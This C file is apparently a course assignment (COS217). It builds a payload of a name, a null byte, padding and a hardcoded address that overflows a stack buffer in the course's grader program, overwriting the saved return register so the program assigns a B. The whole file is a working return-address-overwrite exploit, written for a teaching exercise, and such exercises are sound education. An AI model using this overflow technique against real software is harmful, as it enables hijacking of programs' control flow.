/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Ariel Yuan, Grace Best.                                    */
/* Purpose: "Produces a file called dataB with the student name, a    */
/* nullbyte, padding to overrun the stack, and the address of the     */
/* instruction in main to get a B, the latter of which will           */
/* overwrite getName's stored x30." - cos217 website                  */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Writes to file dataB name of student, the null byte, and lastly 
   the address of the grade B in machine language. Returns 0.  */

FILE *psFILE;
int main(void)
{
    int i;
    unsigned long ulData = 0x400890;    // Address of B instruciton
    psFILE = fopen("dataB", "w");
    fprintf(psFILE, "Ariel & Grace");   // Write our names to file
    fprintf(psFILE, "%c", '\0');     // Write null byte after name

    // Write padding of 34 characters to overrun stack
    for (i = 0; i < 34; i++)
    {
        fprintf(psFILE, "%c", 'a');
    }

    // Overwrite getName's stored x30 w/ instruction to get a B
    fwrite(&ulData, sizeof(unsigned long), 1, psFILE);
    fclose(psFILE);
    return 0;
}